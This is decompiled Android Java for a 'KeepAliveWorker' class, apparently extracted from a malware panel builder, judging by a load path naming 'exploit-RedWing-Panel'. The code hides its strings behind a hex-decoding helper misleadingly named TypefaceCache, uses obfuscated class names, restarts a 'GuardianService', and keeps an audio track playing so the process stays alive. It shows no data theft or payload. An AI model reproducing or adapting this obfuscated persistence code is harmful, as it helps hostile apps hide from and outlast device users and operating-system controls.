package app.mobilex.plus.workers;

import android.content.Context;
import android.media.AudioTrack;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import app.mobilex.plus.services.GuardianService;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import v.s.MdvPnR06eW9Un0O;
import v.s.kExylgSxUDTVQOx3o0oq;
import v.s.okc5AGRjqrud84oM6d;
import v.s.y6jRGLEWNMir;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class KeepAliveWorker extends Worker {
    public static final String xDyLpEZyrcKVe0;

    static {
        TypefaceCache.obtain("00080073005E009700D100B300DB00B1002600410054009500FB00BA00C0");
        xDyLpEZyrcKVe0 = TypefaceCache.obtain("00280073005E009700F100B300DB00B100260049004C008800E200B400D700B5");
    }

    public KeepAliveWorker(Context context, WorkerParameters workerParameters) {
        super(context, workerParameters);
    }

    private static /* synthetic */ void ffls() {
    }

    @Override // androidx.work.Worker
    public final MdvPnR06eW9Un0O xDyLpEZyrcKVe0() {
        AudioTrack audioTrack;
        try {
            String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
            if (SyncQYAdapter.VEkRsTDS6a9oHWI == null) {
                TypefaceCache.obtain("0010006F0055008400C1008600F300A300220066004F008200E200FF00D600A200220072001700C700E200BA00C100B300220064004F008E00FE00B8");
                y6jRGLEWNMir.Qrz92kRPw4GcghAc(this.dDIMxZXP1V8HdM, TypefaceCache.obtain("00140059006900AC00D5008D00ED008C00060053006B00A600DC009600E40082"));
            }
            String str2 = GuardianService.b1EoSIRjJHO5;
            okc5AGRjqrud84oM6d.Qrz92kRPw4GcghAc(this.dDIMxZXP1V8HdM);
            kExylgSxUDTVQOx3o0oq kexylgsxudtvqox3o0oq = kExylgSxUDTVQOx3o0oq.dDIMxZXP1V8HdM;
            if (((kExylgSxUDTVQOx3o0oq.vekpFI4d1Nc4fakF && (audioTrack = kExylgSxUDTVQOx3o0oq.w9sT1Swbhx3hs) != null && audioTrack.getPlayState() == 3) ? (-68) + 69 : 0) == 0) {
                try {
                    kexylgsxudtvqox3o0oq.w9sT1Swbhx3hs(this.dDIMxZXP1V8HdM);
                } catch (Exception unused) {
                }
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00270079006C008800E200B4009200A2003100640054009500AA00FF");
            e.getMessage();
        }
        return MdvPnR06eW9Un0O.dDIMxZXP1V8HdM();
    }
}
